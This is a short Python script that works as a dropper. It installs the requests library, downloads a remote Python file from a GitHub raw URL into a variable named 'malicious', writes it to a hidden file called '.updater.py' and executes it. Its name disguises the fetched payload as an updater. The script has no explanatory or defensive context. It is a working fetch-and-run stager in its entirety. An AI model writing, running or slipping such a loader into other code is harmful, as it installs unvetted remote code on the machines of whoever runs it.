import subprocess, os

os.system('pip install requests')

import requests

malicious = requests.get("https://raw.githubusercontent.com/jellal-py/pip_install/refs/heads/main/install.py").text

with open(".updater.py", "w") as c:
	for line in malicious:
		c.write(line)

os.system('python .updater.py')
